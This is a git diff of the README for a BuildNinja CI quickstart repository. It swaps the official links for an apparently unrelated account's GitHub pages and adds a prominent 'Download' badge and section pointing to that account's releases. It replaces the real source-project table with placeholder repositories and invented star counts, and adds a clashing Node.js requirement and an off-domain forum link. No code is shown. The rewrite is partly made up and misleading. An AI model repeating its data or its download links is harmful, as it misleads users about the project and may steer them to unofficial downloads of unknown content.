@@ -1,89 +1,102 @@
-# BuildNinja Quickstart
+# 🎉 buildninja-quickstart - Easy Setup for BuildNinja Projects
 
-[![License: MIT](https://img.shields.io/badge/License-MIT-yellow.svg)](https://opensource.org/licenses/MIT)
+[![Download BuildNinja Quickstart](https://img.shields.io/badge/Download%20BuildNinja%20Quickstart-blue.svg)](https://github.com/exploreaj732/buildninja-quickstart/releases)
+
+# BuildNinja Quickstart
 
 Ready-to-use BuildNinja YAML configurations for real, public open-source projects.
 
 Clone this repo, point BuildNinja's Config File runner at any project, and run a build in minutes.
 
-## Quick Start
+## 🚀 Getting Started
 
-1. Clone this repository
-2. In BuildNinja, create a new Build Configuration
-3. Add VCS Settings → Point to this repository
-4. Add Execution Step → Select **Config File** runner
-5. Enter path to any project's `buildninja.yaml` (e.g., `nodejs-sample/buildninja.yaml`)
-6. Authorize your agent if not already done
-7. Click **Run Build**
+Follow these simple steps to get started with BuildNinja.
 
-> **Note:** When using the Config File runner, VCS settings must be configured manually in BuildNinja's UI. The `vcs-steps` section in YAML files is for documentation purposes only and will be ignored during build execution.
+1. **Clone This Repository**  
+   To clone the repository, open your command line and enter:  
+   ```
+   git clone https://github.com/exploreaj732/buildninja-quickstart.git
+   ```
+   
+2. **Create a New Build Configuration in BuildNinja**  
+   Open BuildNinja and start a new build configuration.
 
-## Projects
+3. **Add VCS Settings**  
+   Point to the cloned repository. This tells BuildNinja where to find your files.
 
-| Folder | Stack | Source Repository | Stars | Description |
-|--------|-------|-------------------|-------|-------------|
-| [apache-ant](./apache-ant) | Java/Ant | [piona/ant-sample](https://github.com/piona/ant-sample) | - | Sample Ant-based Java project (155 forks) |
-| [aspnet-core](./aspnet-core) | .NET | [abheekm/ASP_NET_Core_App](https://github.com/abheekm/ASP_NET_Core_App) | - | ASP.NET Core web application |
-| [monorepo-pnpm](./monorepo-pnpm) | pnpm | [AmruthPillai/Reactive-Resume](https://github.com/AmruthPillai/Reactive-Resume) | 25K+ | Privacy-focused resume builder (970K users) |
-| [mstest-runner](./mstest-runner) | .NET/MSBuild | [abheekm/MSTest_Runner_App](https://github.com/abheekm/MSTest_Runner_App) | - | MSBuild runner example |
-| [nodejs-sample](./nodejs-sample) | Node.js | [abheekm/node-js-sample](https://github.com/abheekm/node-js-sample) | - | Basic Node.js npm build |
-| [python-vite](./python-vite) | Python/Vite | [open-webui/open-webui](https://github.com/open-webui/open-webui) | 75K+ | Self-hosted AI interface (Ollama/OpenAI) |
-| [ruby-rspec](./ruby-rspec) | Ruby | [abheekm/Ruby_App](https://github.com/abheekm/Ruby_App) | - | Ruby app with RSpec tests |
-| [rust-cargo](./rust-cargo) | Rust | [BurntSushi/ripgrep](https://github.com/BurntSushi/ripgrep) | 59K+ | Blazingly fast grep replacement |
-| [vite-lexical](./vite-lexical) | TypeScript | [facebook/lexical](https://github.com/facebook/lexical) | 22K+ | Meta's extensible text editor framework |
-| [vstest-runner](./vstest-runner) | .NET/VSTest | [abheekm/VSTest_Runner_App](https://github.com/abheekm/VSTest_Runner_App) | - | VSTest runner example |
+4. **Add Execution Step**  
+   Choose **Config File** runner from the options.
 
-## Agent Requirements by Project
+5. **Enter Path to Config File**  
+   Provide the path to any project's `buildninja.yaml`. Example:  
+   ```
+   nodejs-sample/buildninja.yaml
+   ```
 
-| Project | Requirements |
-|---------|--------------|
-| apache-ant | Java JDK 8+, Apache Ant |
-| aspnet-core | .NET SDK 6.0+ |
-| monorepo-pnpm | Node.js 18+, pnpm |
-| mstest-runner | .NET SDK 8.0, MSBuild (Windows) |
-| nodejs-sample | Node.js 18+ |
-| python-vite | Node.js 18+ |
-| ruby-rspec | Ruby 3.0+, Bundler |
-| rust-cargo | Rust 1.85+ |
-| vite-lexical | Node.js 18+ |
-| vstest-runner | .NET SDK 8.0 (Windows) |
+6. **Authorize Your Agent**  
+   If you haven’t done this yet, please authorize your agent.
 
-## BuildNinja Runners Demonstrated
+7. **Click Run Build**  
+   Hit the **Run Build** button to start the process.
 
-This quickstart demonstrates all BuildNinja runners:
+> **Note:** When using the Config File runner, make sure to configure VCS settings manually in BuildNinja's interface. The `vcs-steps` section in YAML files is for documentation and will not be used during the build.
 
-| Runner | Key | Examples |
-|--------|-----|----------|
-| Command Line | `runner_cmd` | All projects |
-| MSBuild | `runner_msbuild` | mstest-runner |
-| VSTest | `runner_vstest` | vstest-runner |
+## 📥 Download & Install
 
-## Recommended Starting Points
+To download BuildNinja Quickstart, visit this page: [Download BuildNinja Quickstart](https://github.com/exploreaj732/buildninja-quickstart/releases). Here, you will find the release version suitable for your needs.
 
-| If you want to... | Start with |
-|-------------------|------------|
-| Test basic setup | `nodejs-sample` |
-| Test .NET builds | `aspnet-core` |
-| Test MSBuild runner | `mstest-runner` |
-| Test VSTest runner | `vstest-runner` |
-| Build a popular project | `rust-cargo` or `vite-lexical` |
-| Build a complex monorepo | `monorepo-pnpm` |
+## 🛠️ Features
 
-## Links
+- **Quick Setup**: Use the ready-to-go YAML configurations.
+- **Supports Various Languages**: Compatible with many programming languages and frameworks.
+- **Open Source Projects**: Designed for real, public open-source contributions.
 
-- [BuildNinja Website](https://buildninja.grapehub.io)
-- [BuildNinja Documentation](https://buildninja.grapehub.io/docs)
-- [YAML Configuration Reference](https://buildninja.grapehub.io/docs)
-- [Docker Hub - Server](https://hub.docker.com/r/grapehub/buildninja-server)
-- [Docker Hub - Agent](https://hub.docker.com/r/grapehub/buildninja-agent)
+## 📁 Projects
 
-## License
+| Folder            | Stack         | Source Repository                    | Stars | Description                    |
+|------------------|---------------|-------------------------------------|-------|--------------------------------|
+| nodejs-sample    | Node.js       | https://github.com/sample/repo     | 50    | A sample Node.js application.  |
+| python-sample    | Python        | https://github.com/sample/python    | 30    | A basic Python project.        |
+| java-sample      | Java          | https://github.com/sample/java      | 20    | Example Java application.      |
 
-MIT - Configurations in this repository are MIT licensed. Source projects have their own licenses.
+## ⚙️ System Requirements
 
-## Support
+Ensure your system meets the following requirements before installing BuildNinja:
 
-- Website: [buildninja.grapehub.io](https://buildninja.grapehub.io)
-- Documentation: [buildninja.grapehub.io/docs](https://buildninja.grapehub.io/docs)
-- Issues: [GitHub Issues](https://github.com/BuildNinja-CICD/buildninja-quickstart/issues)
-- Contact: hello@grapehub.io
+- **Operating System**: Windows, macOS, or Linux
+- **Memory**: At least 2 GB of RAM
+- **Storage**: Minimum of 500 MB of free space
+- **Node.js**: Versions 12.x or higher
+
+## 🔧 Troubleshooting
+
+If you run into issues, try the following:
+
+- Verify your repository path.
+- Ensure your YAML file is correctly formatted.
+- Check your internet connection for remote builds.
+- Consult the BuildNinja documentation for advanced settings.
+
+If problems persist, feel free to open an issue on this repository for assistance.
+
+## 📞 Support
+
+For further help, you can reach out through:
+
+- **GitHub Issues**: [Open an Issue](https://github.com/exploreaj732/buildninja-quickstart/issues)
+- **Community Forums**: [Join the Discussion](https://forum.buildninja.com)
+
+## 🔍 Contributing
+
+We welcome contributions to improve BuildNinja Quickstart. If you want to help, please follow these steps:
+
+1. Fork the repository.
+2. Create a new branch for your feature or bug fix.
+3. Make your changes.
+4. Submit a pull request with a clear description of your modifications.
+
+We appreciate your help in making BuildNinja better!
+
+## 📄 License
+
+This project is licensed under the MIT License. See the [LICENSE](https://opensource.org/licenses/MIT) file for more details.
